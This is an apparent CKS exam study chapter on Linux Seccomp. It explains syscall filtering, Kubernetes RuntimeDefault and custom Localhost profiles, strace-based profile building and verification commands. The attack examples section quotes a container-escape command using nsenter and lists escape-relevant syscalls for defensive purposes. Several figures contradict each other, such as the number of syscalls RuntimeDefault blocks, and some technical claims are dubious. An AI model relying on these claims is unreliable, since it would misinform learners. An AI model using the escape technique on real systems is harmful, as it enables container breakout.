🧠 Seccomp in the CKS Exam — What They Actually Test

The CKS exam tests Seccomp in a focused, practical way. You need to know:

  • Apply RuntimeDefault to a pod: The simplest Seccomp task — add seccompProfile: type: RuntimeDefault to a pod's securityContext. Every pod should have this by default.
  • Create and apply a custom Localhost profile: Write a JSON file, copy it to /var/lib/kubelet/seccomp/ on every node, reference it in the pod spec.
  • Verify the profile is active: Check /proc/<pid>/status for Seccomp: 2 (filter mode) or 0 (disabled).
  • CRITICAL EXAM FACT: Custom Seccomp profiles must be in /var/lib/kubelet/seccomp/ on the node — NOT /etc/seccomp/ or anywhere else. The CKS exam WILL test that you know the correct directory.

15.1 What Is Seccomp and Why Does It Protect Containers?

Seccomp stands for Secure Computing Mode. It is a Linux kernel feature (available since kernel 2.6.12, 2005) that allows a process to restrict which system calls it can make. Think of it as a firewall for syscalls — every time a containerized process wants to talk to the kernel (to open a file, create a socket, spawn a thread), Seccomp checks: "Is this syscall on the allowed list?" If yes → proceed. If no → block (kill the process or return an error).

Where Seccomp Sits in the Security Stack — The Syscall Boundary

Linux Security Layers — Where Seccomp Operates vs Other Controls
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  USER SPACE (Ring 3)                                                      │
  │                                                                          │
  │  ┌──────────────────────────────────────────────────────────────────┐   │
  │  │  KUBERNETES RBAC (Ch9)                                            │   │
  │  │  Controls: Who can kubectl create/delete pods?                    │   │
  │  │  Level: Kubernetes API server                                     │   │
  │  ├──────────────────────────────────────────────────────────────────┤   │
  │  │  POD SECURITY STANDARDS (Ch17)                                    │   │
  │  │  Controls: Can this pod run as root? Privileged?                  │   │
  │  │  Level: Pod admission + runtime configuration                     │   │
  │  ├──────────────────────────────────────────────────────────────────┤   │
  │  │  APPARMOR (Ch14)                                                   │   │
  │  │  Controls: Can this process read /etc/shadow? Open TCP sockets?   │   │
  │  │  Level: File paths, network protocols, Linux capabilities         │   │
  │  └──────────────────────────────────────────────────────────────────┘   │
  │                                                                          │
  │  ═══════════════════════════ SYSCALL BOUNDARY ═══════════════════════════ │
  │  (CPU switches from Ring 3 → Ring 0. This is where Seccomp lives.)      │
  │                                                                          │
  │  ┌──────────────────────────────────────────────────────────────────┐   │
  │  │  SECCOMP (Ch15) — THIS CHAPTER                                    │   │
  │  │  Controls: Which syscalls can this process make?                  │   │
  │  │  Level: The syscall interface itself — the LAST checkpoint        │   │
  │  │  before the kernel executes the requested operation.              │   │
  │  │                                                                    │   │
  │  │  ⚡ Seccomp runs AFTER AppArmor, AFTER DAC, AFTER capabilities.   │   │
  │  │  Even if ALL other security checks pass, Seccomp can still say NO.│   │
  │  └──────────────────────────────────────────────────────────────────┘   │
  │                                                                          │
  │  KERNEL SPACE (Ring 0)                                                   │
  │  ┌──────────────────────────────────────────────────────────────────┐   │
  │  │  LINUX KERNEL                                                     │   │
  │  │  Executes the syscall (if Seccomp allowed it)                     │   │
  │  │  • open("/etc/shadow") → reads the file FROM DISK                 │   │
  │  │  • mount("tmpfs", "/mnt") → attaches filesystem                   │   │
  │  │  • ptrace(PTRACE_ATTACH, pid) → attaches to another process       │   │
  │  └──────────────────────────────────────────────────────────────────┘   │
  └──────────────────────────────────────────────────────────────────────────┘

The Numbers That Matter — 300+ Syscalls, Only 60 Needed

The Linux kernel exposes over 300 system calls. A typical web application (Django + Gunicorn + PostgreSQL driver) uses approximately 40-60 of them. The remaining 250+ are the syscalls that attackers rely on for container escapes, privilege escalation, and persistence. Here is the breakdown:

Linux Syscall Landscape — What Django Needs vs What Attackers Use
  🐧 LINUX KERNEL: 300+ AVAILABLE SYSCALLS
  │
  ├─ ✅ DJANGO NEEDS (~40-60 syscalls):
  │    read, write, open, close, stat, fstat, lstat, poll,
  │    lseek, mmap, mprotect, munmap, brk, rt_sigaction,
  │    rt_sigprocmask, ioctl, pread64, pwrite64, readv, writev,
  │    access, pipe, select, sched_yield, mremap, msync, mincore,
  │    madvise, shmget, shmat, shmctl, dup, dup2, pause,
  │    nanosleep, getitimer, alarm, setitimer, getpid, sendfile,
  │    socket, connect, accept, sendto, recvfrom, sendmsg, recvmsg,
  │    shutdown, bind, listen, getsockname, getpeername,
  │    socketpair, setsockopt, getsockopt, clone (for threads),
  │    futex, execve, exit, wait4, getcwd, chdir, fchdir,
  │    getdents64, unlink, fcntl, flock, fsync, fdatasync,
  │    ftruncate, getrlimit, getrusage, gettimeofday, times...
  │
  └─ ❌ ATTACKERS USE (~250+ syscalls — blocked by Seccomp):
       ┌──────────────────────────────────────────────────────────────┐
       │  DANGEROUS SYSCALL  │  WHAT IT ENABLES          │ BLOCKED BY │
       ├─────────────────────┼───────────────────────────┼────────────┤
       │  mount              │ Mount filesystems to      │ RuntimeDef │
       │                     │ escape container          │            │
       │  umount2            │ Unmount — companion       │ RuntimeDef │
       │  ptrace             │ Attach to other processes │ RuntimeDef │
       │  kexec_load         │ Replace running kernel    │ RuntimeDef │
       │  kexec_file_load    │ Replace kernel (file)     │ RuntimeDef │
       │  init_module        │ Load kernel module        │ RuntimeDef │
       │  finit_module       │ Load kernel module (fd)   │ RuntimeDef │
       │  delete_module      │ Unload kernel module      │ RuntimeDef │
       │  setns              │ Join another namespace    │ RuntimeDef │
       │  unshare            │ Create new namespaces     │ RuntimeDef │
       │  clone (CLONE_NEW*) │ Namespace-creation clone  │ RuntimeDef │
       │  personality        │ Change execution domain   │ RuntimeDef │
       │  bpf                │ Load BPF programs         │ RuntimeDef │
       │  perf_event_open    │ Performance monitoring    │ RuntimeDef │
       │  socket (AF_PACKET) │ Raw network sockets       │ Custom     │
       │  reboot             │ Reboot the system         │ RuntimeDef │
       │  swapon/swapoff     │ Enable/disable swap       │ RuntimeDef │
       │  clock_settime      │ Change system clock       │ RuntimeDef │
       └──────────────────────────────────────────────────────────────┘

  WITH SECCOMP (RuntimeDefault): ~44 dangerous syscalls BLOCKED.
  WITH CUSTOM PROFILE: ALL 250+ unnecessary syscalls BLOCKED.

  200+ syscalls × 0 attack surface = an attacker's toolbox reduced by 83%.

How Seccomp Works at the Kernel Level — BPF Programs as Syscall Filters

Seccomp does not use a simple allow/deny list. It uses Berkeley Packet Filter (BPF) programs — small, verifiable programs that run inside the kernel. When a process makes a syscall, the kernel runs the BPF program. The BPF program inspects the syscall number and arguments, then returns one of several actions. This is the same BPF technology that powers modern networking (eBPF, Cilium) and observability tools:

Seccomp BPF Filter Execution — From JSON Profile to Kernel Decision
  CONTAINER PROCESS: Django calls open("/etc/shadow", O_RDONLY)
  │
  ▼
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  STEP 1: CPU switches to kernel mode (Ring 0) via syscall instruction    │
  │  ────────────────────────────────────────────────────────                 │
  │  The process executes the `syscall` instruction (x86-64) or `svc` (ARM).  │
  │  This is the hardware mechanism that transitions from user space to       │
  │  kernel space.                                                            │
  └──────────────────────────────────────────────────────────────────────────┘
  │
  ▼
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  STEP 2: Seccomp BPF Program Runs (BEFORE the syscall executes)         │
  │  ───────────────────────────────────────────────────────────              │
  │  The kernel invokes the Seccomp BPF filter attached to this process.     │
  │  The filter is a small program compiled from the JSON profile:           │
  │                                                                          │
  │  BPF PROGRAM LOGIC (simplified):                                         │
  │  ┌──────────────────────────────────────────────────────────────────┐   │
  │  │  1. Load the syscall number from the CPU register (rax on x86)   │   │
  │  │  2. Compare against the allowed list: read, write, open, close,  │   │
  │  │     stat, socket, connect, accept, futex, clone, ...              │   │
  │  │  3. If syscall number MATCHES allowed list → return SECCOMP_RET_ALLOW│
  │  │  4. If syscall number MATCHES blocked list → return SECCOMP_RET_ERRNO│
  │  │     or SECCOMP_RET_KILL (depending on defaultAction)              │   │
  │  │  5. If syscall number NOT in any list → return defaultAction      │   │
  │  └──────────────────────────────────────────────────────────────────┘   │
  │                                                                          │
  │  For the anihpj-django custom profile, the check is:                     │
  │  • Syscall: open (number 2 on x86-64) → is "open" in allowed list?      │
  │  • YES → return SECCOMP_RET_ALLOW (0)                                    │
  │  • The syscall proceeds. The kernel executes the open() operation.       │
  └──────────────────────────────────────────────────────────────────────────┘
  │
  ▼  (open() proceeds — the kernel opens the file)
  │
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  BUT IF THE SYSCALL WAS mount():                                         │
  │  ────────────────────────────────                                         │
  │  • Syscall: mount (number 165 on x86-64) → is "mount" in allowed list?   │
  │  • NO → return defaultAction: SCMP_ACT_ERRNO                              │
  │  • The syscall is ABORTED. The kernel returns -EPERM to the process.      │
  │  • The mount NEVER happens. The filesystem was never touched.             │
  │  • Audit message generated: "seccomp: mount() blocked for pid 12345"     │
  └──────────────────────────────────────────────────────────────────────────┘

  SECCOMP RETURN ACTIONS (what the BPF program can return):
  ────────────────────────────────────────────────────────
  SECCOMP_RET_KILL_PROCESS  → Kill the entire process (default for strict mode)
  SECCOMP_RET_KILL_THREAD   → Kill only the offending thread
  SECCOMP_RET_ERRNO         → Return an error (EPERM) to the process
  SECCOMP_RET_TRAP          → Send SIGSYS to the process (can be caught)
  SECCOMP_RET_LOG           → Log the syscall but ALLOW it (audit mode)
  SECCOMP_RET_ALLOW         → Allow the syscall to proceed

Seccomp Actions — SCMP_ACT_ERRNO vs SCMP_ACT_KILL vs SCMP_ACT_LOG

When a syscall is NOT in the allowed list, Seccomp must decide what to do. The defaultAction in your profile determines this — and choosing the wrong action can crash your application or leave you unprotected:

ActionBehaviorProcess Dies?Error to App?Logged?When to Use
SCMP_ACT_KILLKill the process immediately. No error returned — the process is dead.✅ YES — process killed by kernel❌ No — app crashes✅ Yes (audit)Strict security: if the app makes an unexpected syscall, it's probably compromised. Kill it.
SCMP_ACT_ERRNOReturn an error code (usually EPERM) to the process. The process stays alive and can handle the error.❌ No — process survives✅ Yes — EPERM✅ Yes (audit)CKS exam standard. Safer for production — the app gets a "Permission denied" and can log/retry instead of crashing.
SCMP_ACT_LOGLog the syscall but ALLOW it. No blocking.❌ No❌ No — syscall succeeds✅ Yes — logged as "allowed"Profile development/testing. Like AppArmor complain mode — learn what syscalls your app uses without breaking anything.
SCMP_ACT_TRAPSend SIGSYS signal to the process. The process can catch it with a signal handler.⚠️ Only if unhandled⚠️ SIGSYS✅ YesSpecialized use: processes that want to handle blocked syscalls gracefully via signal handlers.

How Syscalls Work at the CPU Level — The Assembly That Triggers It All

Understanding exactly what happens when a program makes a syscall helps you appreciate why Seccomp is so powerful — and so fast. A syscall is not a function call. It is a CPU instruction that triggers a hardware-level transition from user mode (Ring 3) to kernel mode (Ring 0). This transition is expensive (~100-300 CPU cycles), which is why blocking unnecessary syscalls also slightly improves performance:

The CPU-Level Mechanics of a System Call — From Python to Kernel
  DJANGO PYTHON CODE: with open('/app/media/photo.jpg', 'rb') as f:
  │
  ▼
  PYTHON STANDARD LIBRARY: io.open() → _pyio.open() → builtins.open()
  │  (Python wraps the C library's open() function)
  ▼
  GLIBC (C LIBRARY): open("/app/media/photo.jpg", O_RDONLY)
  │
  │  On x86-64, glibc does:
  │  ┌─────────────────────────────────────────────────────────────┐
  │  │  mov rax, 2          ; syscall number for 'open' is 2       │
  │  │  mov rdi, filename   ; pointer to "/app/media/photo.jpg"    │
  │  │  mov rsi, O_RDONLY   ; flags = read-only                    │
  │  │  mov rdx, 0          ; mode (not used for open)             │
  │  │  syscall             ; ← THE MAGIC INSTRUCTION              │
  │  │                      ; CPU switches Ring 3 → Ring 0         │
  │  │                      ; Kernel entry point: entry_SYSCALL_64 │
  │  └─────────────────────────────────────────────────────────────┘
  │
  ▼
  KERNEL ENTRY (entry_SYSCALL_64 in arch/x86/entry/entry_64.S):
  │
  │  1. Save user-space registers to the kernel stack.
  │  2. Switch to kernel page tables (CR3 register swap).
  │  3. Look up syscall number 2 in the sys_call_table array:
  │     sys_call_table[2] = __x64_sys_open  (the actual C function)
  │
  │  ⚡ SECCOMP CHECK HAPPENS HERE (before __x64_sys_open runs):
  │  ──────────────────────────────────────────────────────────
  │  The kernel calls __secure_computing() which invokes the
  │  Seccomp BPF filter attached to this process.
  │
  │  The BPF program inspects:
  │  • seccomp_data.nr = 2 (the syscall number from rax)
  │  • seccomp_data.args[0] = pointer to filename
  │  • seccomp_data.args[1] = O_RDONLY
  │  • seccomp_data.arch = AUDIT_ARCH_X86_64
  │
  │  BPF DECISION: Is syscall number 2 (open) in the allowed list?
  │  → Yes (open is in the anihpj-django profile) → SECCOMP_RET_ALLOW
  │
  │  4. Seccomp returned ALLOW → kernel proceeds to __x64_sys_open()
  │  5. __x64_sys_open() resolves the path, checks DAC/AppArmor,
  │     opens the file, returns a file descriptor.
  │  6. Restore user-space registers. Switch back to Ring 3.
  │  7. `syscall` instruction RETURNS to the instruction after `syscall`.
  │  8. rax now contains the file descriptor (e.g., 3).
  │
  ▼
  BACK IN USER SPACE: Python receives file descriptor 3.
  The file is open. Total time: ~0.3 microseconds (including Seccomp check).

  WHY SECCOMP IS SO FAST:
  ───────────────────────
  • The BPF program runs ENTIRELY within the kernel, with NO context switch.
  • BPF programs are limited to 4096 instructions max — they complete in
    nanoseconds.
  • The BPF JIT compiler (if enabled) translates BPF bytecode to native x86
    instructions — the filter runs at native CPU speed.
  • Overhead: typically < 0.1% for workloads making many syscalls.

Building a Seccomp Profile from Scratch — Using strace to Discover Syscalls

Writing a custom Seccomp profile is not about guessing which syscalls your app needs. It's about observing what your app actually calls. The tool for this is strace — it intercepts and logs every syscall a process makes. Here is the workflow to build a production-ready profile:

Bash — Building a Seccomp profile with strace 
# STEP 1: Run your application under strace (inside the container or on a test node)
# -f = follow child processes (Gunicorn forks workers)
# -c = count syscalls (summary mode)
# -o = output to file
strace -f -c -o /tmp/syscalls-summary.txt -- gunicorn anihpj.wsgi:application

# STEP 2: After running the app through its full workflow (HTTP requests,
# DB queries, file uploads, static file serving), stop it and check the summary:
cat /tmp/syscalls-summary.txt
# Output:
# % time     seconds  usecs/call     calls    errors syscall
# ------ ----------- ----------- --------- --------- ----------------
#  45.23    0.451234         123      3669           read
#  23.12    0.230567          89      2590           write
#  12.34    0.123123          45      2736           futex
#   5.67    0.056789          34      1670           poll
#   3.45    0.034456          28      1231           epoll_wait
#   ... (40-60 unique syscalls total)

# STEP 3: Extract just the unique syscall names (the list that matters):
awk '{print $NF}' /tmp/syscalls-summary.txt | grep -v '^$' | grep -v 'syscall' | grep -v '^---' | grep -v '^%' | grep -v '^total' | sort -u
# Output: accept4, access, bind, brk, chdir, clone, close, connect, dup,
#         epoll_create1, epoll_ctl, execve, exit_group, fcntl, fstat,
#         futex, getpid, getsockname, getsockopt, ioctl, listen, lseek,
#         mmap, mprotect, munmap, openat, poll, prctl, read, recvfrom,
#         rt_sigaction, rt_sigprocmask, sendto, setsockopt, socket,
#         stat, uname, wait4, write, writev...

# STEP 4: These are your ALLOW list. Everything else should be blocked.
# Build the JSON profile with ONLY these syscalls in the allowed list.

# STEP 5: IMPORTANT — strace shows what your app calls in THIS session.
# Run your app through ALL code paths (every endpoint, every background
# task) to ensure you haven't missed any legitimate syscalls.
# A syscall that only runs during database migrations might not appear
# during normal HTTP request tracing.

# STEP 6: Deploy in LOG mode first (SCMP_ACT_LOG as defaultAction):
# Let the app run in production for 24-48 hours while logging all
# syscalls not in your allowed list. Add any legitimate ones you missed.

Syscall Attack Reduction — What Seccomp Actually Blocks

Linux Kernel Has ~300+ Syscalls — Seccomp Reduces Your Attack Surface
  🐧 LINUX KERNEL HAS ~300+ SYSCALLS

  A typical Django app uses ≈ 40-60 syscalls:
  read, write, open, close, socket, connect, accept...

  WITHOUT Seccomp:
  Attacker can use ANY of 300+ syscalls to:
    → ptrace another process
    → mount filesystems
    → load kernel modules
    → create raw sockets

  WITH Seccomp (RuntimeDefault profile):
  Only the ~60 needed syscalls are allowed
  240+ dangerous syscalls: blocked at kernel level

  ┌──────────────────────────────────────────────────────────────┐
  │  DANGEROUS SYSCALL  │  WHAT IT ENABLES          │ BLOCKED BY │
  ├─────────────────────┼───────────────────────────┼────────────┤
  │  ptrace             │ Attach to another process,│ RuntimeDef │
  │                     │ read its memory           │            │
  │  mount              │ Mount filesystems         │ RuntimeDef │
  │                     │ (escape container)        │            │
  │  kexec_load         │ Replace running kernel    │ RuntimeDef │
  │  create_module      │ Load kernel module        │ RuntimeDef │
  │  setns              │ Join another namespace    │ RuntimeDef │
  │                     │ (namespace escape)        │            │
  │  unshare            │ Create new namespaces     │ RuntimeDef │
  │  socket (raw)       │ Create raw network sockets│ Custom     │
  │                     │ (craft malicious packets) │ profile    │
  └──────────────────────────────────────────────────────────────┘

  🔑 CKS EXAM TIP: RuntimeDefault blocks ~44 dangerous syscalls
     out of ~300+. This is the safest starting point and the
     answer to most "apply a seccomp profile" questions on the exam.

15.2 Seccomp Profiles — RuntimeDefault and Custom

Kubernetes supports three Seccomp profile types, and the CKS exam expects you to know exactly when to use each one. The choice between them is a security tradeoff: RuntimeDefault is safe and easy but blocks only ~44 syscalls. Custom profiles can block 250+ syscalls but require careful testing. Unconfined blocks nothing — and should never be used in production.

The Three Profile Types — Comparated

Profile TypeWhat It DoesSyscalls BlockedWhere DefinedWhen to UseSecurity Level
UnconfinedNo Seccomp filter. All 300+ syscalls available.0 (none)N/A — it's the absence of a profileDebugging only. Never in production.🔴 NONE
RuntimeDefaultUses the container runtime's built-in default seccomp profile.~44 syscallsBuilt into containerd/CRI-O/DockerDefault for all pods. Minimum security baseline.🟢 GOOD
LocalhostCustom JSON profile stored on the node's filesystem.200+ (fully customizable)/var/lib/kubelet/seccomp/ on each nodeProduction hardening. Tailor to your app's exact syscall needs.🟢 BEST

RuntimeDefault — What It Actually Blocks

The RuntimeDefault profile is NOT a Kubernetes construct — it is the Docker/containerd default seccomp profile, which has been the default for Docker since 2016. It blocks approximately 44 syscalls out of 300+, targeting the most commonly abused ones. Here are the key syscalls RuntimeDefault blocks:

RuntimeDefault Blocked Syscalls — The 44 That Docker Decided Are Too Dangerous
  RUNTIMEDEFAULT BLOCKS THESE SYSCALLS (partial list of the ~44):
  ─────────────────────────────────────────────────────────
  • mount, umount2        → Cannot mount/unmount filesystems
  • kexec_load, kexec_file_load → Cannot replace running kernel
  • init_module, finit_module, delete_module → Cannot load/unload kernel modules
  • ptrace                → Cannot attach debugger to other processes
  • personality           → Cannot change execution domain
  • setns, unshare        → Cannot join/create namespaces (ESCAPE VECTOR)
  • clone (with CLONE_NEWUSER, CLONE_NEWNET, etc.) → Blocked namespace-creation flags
  • bpf                   → Cannot load BPF programs
  • perf_event_open       → Cannot use performance monitoring (side-channel defense)
  • reboot                → Cannot reboot the system
  • swapon, swapoff       → Cannot enable/disable swap
  • clock_settime         → Cannot change system time
  • name_to_handle_at,    → Cannot resolve file handles (used for filesystem escapes)
    open_by_handle_at
  • kcmp                  → Cannot compare processes (used for ASLR bypass)
  • add_key, request_key, keyctl → Cannot manipulate kernel keyring
  • process_vm_readv,      → Cannot read/write another process's memory
    process_vm_writev
  • move_pages            → Cannot move memory pages (used for Rowhammer attacks)

  ⚡ KEY: RuntimeDefault blocks the syscalls that are MOST commonly used in
     container escape exploits. It is the MINIMUM every pod should have.
     But it leaves 250+ syscalls unblocked. For critical workloads, you
     need a custom profile that also blocks the other 200+.

Custom Seccomp Profile — JSON Format Explained

A custom Seccomp profile is a JSON file with a specific structure. The defaultAction sets the baseline — what happens to syscalls NOT in the list. The syscalls array overrides the default for specific syscalls:

JSON — Anatomy of a Seccomp Profile 
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_AARCH64"
  ],
  "flags": [
    "SECCOMP_FILTER_FLAG_LOG"
  ],
  "syscalls": [
    {
      "names": ["read", "write", "open", "openat", "close"],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["mount", "umount2", "ptrace", "kexec_load"],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}
🎯
defaultAction

What happens to syscalls NOT in any list. SCMP_ACT_ERRNO (return error) is the standard. SCMP_ACT_KILL for maximum security.

📋
syscalls[].names

Array of syscall names (strings). Use the Linux syscall name: "mount", not "__NR_mount" (165).

✅
syscalls[].action

ALLOW, ERRNO, KILL, LOG, or TRAP. Overrides defaultAction for these specific syscalls.

🏗️
architectures

Which CPU architectures this profile applies to. Must include your node's architecture (typically x86_64).

Complete Custom Seccomp Profile for anihpj Django

JSON — /var/lib/kubelet/seccomp/anihpj-django.json 
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": [
    "SCMP_ARCH_X86_64"
  ],
  "syscalls": [
    {
      "names": [
        "accept", "accept4", "access", "alarm", "bind",
        "brk", "capget", "chdir", "clock_gettime", "clone",
        "close", "connect", "dup", "dup2", "epoll_create1",
        "epoll_ctl", "epoll_pwait", "execve", "exit", "exit_group",
        "fchdir", "fcntl", "fdatasync", "flock", "fstat",
        "fstatfs", "fsync", "ftruncate", "futex",
        "getcwd", "getdents64", "getegid", "geteuid", "getgid",
        "getpeername", "getpid", "getppid", "getrandom", "getrlimit",
        "getsockname", "getsockopt", "gettid", "gettimeofday",
        "getuid", "ioctl", "kill", "listen", "lseek",
        "madvise", "mprotect", "mmap", "mremap", "msync",
        "munmap", "nanosleep", "open", "openat", "pause",
        "pipe", "pipe2", "poll", "ppoll", "prctl",
        "pread64", "pwrite64", "read", "readlink", "readv",
        "recvfrom", "recvmsg", "rename", "rt_sigaction",
        "rt_sigpending", "rt_sigprocmask", "rt_sigreturn",
        "rt_sigsuspend", "rt_sigtimedwait",
        "sched_getaffinity", "sched_getparam", "sched_getscheduler",
        "sched_yield", "select", "sendmsg", "sendto",
        "set_robust_list", "setsockopt", "shmat", "shmctl",
        "shmdt", "shmget", "shutdown", "sigaltstack", "socket",
        "socketpair", "stat", "statfs", "sysinfo", "tgkill",
        "times", "unlink", "unlinkat", "utimensat", "wait4",
        "write", "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}

This profile allows ~90 syscalls — the union of what Django, Gunicorn, Python, and the PostgreSQL driver need. The defaultAction: SCMP_ACT_ERRNO blocks everything else (~210+ syscalls). Note what's NOT on the allowed list: mount, ptrace, unshare, setns, kexec_load, bpf, init_module — every container escape and privilege escalation syscall is blocked by the default.

Real-World Seccomp Attack Examples — Why This Matters

REAL ATTACKS Three Attacks That Seccomp Would Have Blocked
1
Dirty COW (CVE-2016-5195) — Privilege escalation via /proc/self/mem

Attacker exploits a race condition to write to read-only memory mappings. Requires ptrace and /proc/self/mem access. Seccomp RuntimeDefault blocks ptrace — the exploit fails at the kernel level before the race condition can be triggered.

2
Container escape via nsenter (2021) — Namespace breakout

Attacker uses nsenter --target 1 --all to join the host's namespaces, escaping the container entirely. Requires setns syscall. Seccomp RuntimeDefault blocks setns — the attacker cannot escape to host namespaces.

3
Kernel module rootkit (2022) — Persistent stealth malware

Attacker compiles a malicious kernel module (.ko file) that hides processes and files. Requires init_module or finit_module syscall. Seccomp blocks both — the rootkit cannot be loaded. Without Seccomp, this attack gives the attacker permanent, invisible control of the entire node.

15.3 Applying Seccomp in Kubernetes Pod Specs

Once your custom Seccomp profile JSON is on every node at /var/lib/kubelet/seccomp/, you apply it to a pod via securityContext.seccompProfile. This is the native field (GA since K8s 1.19) — there is no annotation-based method for Seccomp unlike AppArmor.

Pod with RuntimeDefault Seccomp — The Minimum Baseline

YAML — anihpj Django pod with RuntimeDefault Seccomp 
apiVersion: v1
kind: Pod
metadata:
  name: anihpj-django
  namespace: anihpj
spec:
  securityContext:
    seccompProfile:
      type: RuntimeDefault  # ← Every pod should have this
  containers:
  - name: anihpj
    image: registry.anihpj.com/anihpj-django:v2.0.0
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      allowPrivilegeEscalation: false
      capabilities:
        drop: [ALL]
      readOnlyRootFilesystem: true

Pod with Custom Localhost Seccomp Profile

YAML — anihpj Django pod with custom Seccomp profile 
apiVersion: v1
kind: Pod
metadata:
  name: anihpj-django
  namespace: anihpj
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: anihpj-django.json  # File at: /var/lib/kubelet/seccomp/
  containers:
  - name: anihpj
    image: registry.anihpj.com/anihpj-django:v2.0.0

Deploying Custom Seccomp Profiles to All Nodes

Bash — Copy Seccomp profile to all nodes in the cluster 
#!/bin/bash
# Deploy anihpj-django.json seccomp profile to ALL worker nodes
PROFILE="anihpj-django.json"
NODES=$(kubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type=="InternalIP")].address}')

for NODE in $NODES; do
    echo "=== Deploying to $NODE ==="
    scp $PROFILE root@${NODE}:/var/lib/kubelet/seccomp/${PROFILE}
    ssh root@${NODE} "chmod 644 /var/lib/kubelet/seccomp/${PROFILE}"
    ssh root@${NODE} "ls -la /var/lib/kubelet/seccomp/${PROFILE}"
done

echo "✅ Profile deployed to all nodes"

How containerd Applies Seccomp — The OCI Runtime Spec Integration

When Kubernetes creates a pod, the kubelet delegates container creation to the container runtime (containerd or CRI-O) via the CRI (Container Runtime Interface). The runtime then translates the pod spec into an OCI (Open Container Initiative) runtime spec — and this is where Seccomp is actually applied. Understanding this chain helps you debug when Seccomp profiles don't take effect:

Kubernetes Pod Spec → OCI Runtime Spec → Kernel Seccomp
  KUBERNETES POD YAML:
  ─────────────────────
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: anihpj-django.json
  │
  ▼
  KUBELET (on the node):
  ──────────────────────
  1. Reads the pod spec from the API server.
  2. Detects seccompProfile: type=Localhost, localhostProfile=anihpj-django.json
  3. Resolves the profile path: /var/lib/kubelet/seccomp/anihpj-django.json
  4. Reads the JSON file and stores it.
  5. Calls CRI: RunPodSandbox() → CreateContainer()
  6. In CreateContainer, passes the seccomp profile to containerd.
  │
  ▼
  CONTAINERD (CRI runtime):
  ─────────────────────────
  1. Receives the CreateContainerRequest with the seccomp profile.
  2. Translates into OCI runtime spec (config.json):
     ┌──────────────────────────────────────────────────────────────┐
     │  {                                                           │
     │    "linux": {                                                 │
     │      "seccomp": {                                             │
     │        "defaultAction": "SCMP_ACT_ERRNO",                      │
     │        "architectures": ["SCMP_ARCH_X86_64"],                 │
     │        "syscalls": [                                           │
     │          {"names": ["open", "read", "write", ...],           │
     │           "action": "SCMP_ACT_ALLOW"}                         │
     │        ]                                                       │
     │      }                                                         │
     │    }                                                           │
     │  }                                                             │
     └──────────────────────────────────────────────────────────────┘
  3. Passes this OCI spec to runc (the low-level OCI runtime).
  │
  ▼
  RUNC (OCI runtime):
  ───────────────────
  1. Reads the OCI spec's linux.seccomp section.
  2. Converts the JSON into a BPF program using libseccomp.
  3. Calls seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC, &bpf)
     BEFORE executing the container's entrypoint.
  4. The BPF program is NOW attached to the container's init process (PID 1).
  5. All child processes inherit the seccomp filter automatically
     (thanks to SECCOMP_FILTER_FLAG_TSYNC — thread synchronization).
  6. Runc then execve()s the container's entrypoint.
  │
  ▼
  CONTAINER PROCESS (PID 1):
  ──────────────────────────
  Every syscall made by this process (and all its children) goes through
  the BPF seccomp filter. The filter was installed BEFORE the entrypoint
  started — it was never unconfined, even for a microsecond.

  ⚡ THIS IS WHY THE PROFILE MUST BE ON THE NODE BEFORE THE POD STARTS:
  ────────────────────────────────────────────────────────────────────
  The kubelet resolves and reads the profile file during CreateContainer.
  If the file doesn't exist at CreateContainer time, the container
  creation FAILS with:
  "cannot load seccomp profile /var/lib/kubelet/seccomp/anihpj-django.json:
   no such file or directory"
  The pod stays in ContainerCreating. There is no retry with a different
  profile — you must fix the file and recreate the pod.

Syscall Argument Filtering — Going Beyond Just Syscall Names

Seccomp BPF can filter not just WHICH syscall is being made, but also the arguments to that syscall. This allows very fine-grained policies — for example, allowing socket() but ONLY for AF_INET (IPv4) and SOCK_STREAM (TCP), not AF_PACKET (raw sockets). This is how the Docker default profile blocks raw sockets while allowing normal TCP sockets:

JSON — Seccomp profile with argument filtering (block raw sockets, allow TCP) 
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {
      "names": ["socket"],
      "action": "SCMP_ACT_ERRNO",
      "args": [
        {
          "index": 0,
          "value": 17,
          "valueTwo": 0,
          "op": "SCMP_CMP_EQ"
        }
      ],
      "comment": "Block AF_PACKET (raw sockets). Index 0 = first argument (domain). Value 17 = AF_PACKET."
    },
    {
      "names": ["socket"],
      "action": "SCMP_ACT_ALLOW",
      "args": [
        {
          "index": 0,
          "value": 2,
          "op": "SCMP_CMP_EQ"
        }
      ],
      "comment": "Allow AF_INET (IPv4). Value 2 = AF_INET. TCP and UDP sockets use this."
    }
  ]
}
0
index

Which argument to inspect (0 = first argument, 1 = second, etc.). Syscall arguments are in registers: rdi, rsi, rdx, r10, r8, r9.

V
value

The value to compare against. For socket(), value 2 = AF_INET, value 10 = AF_INET6, value 17 = AF_PACKET.

=
op (operator)

SCMP_CMP_EQ (equal), SCMP_CMP_NE (not equal), SCMP_CMP_LT (less than), SCMP_CMP_GT (greater than), SCMP_CMP_MASKED_EQ (bitmask match).

Verifying Seccomp Is Active — Multiple Methods

Bash — Verify Seccomp profile is applied and blocking 
# METHOD 1: Check pod's securityContext
kubectl get pod anihpj-django -n anihpj -o jsonpath='{.spec.securityContext.seccompProfile}'
# Output: {"localhostProfile":"anihpj-django.json","type":"Localhost"}

# METHOD 2: Check process status INSIDE the container (most reliable)
kubectl exec -n anihpj anihpj-django -- cat /proc/1/status | grep Seccomp
# Output: Seccomp: 2  (2 = SECCOMP_MODE_FILTER — profile is active)
#          Seccomp: 0  (0 = SECCOMP_MODE_DISABLED — NO profile!)
#          Seccomp: 1  (1 = SECCOMP_MODE_STRICT — legacy mode, rare)

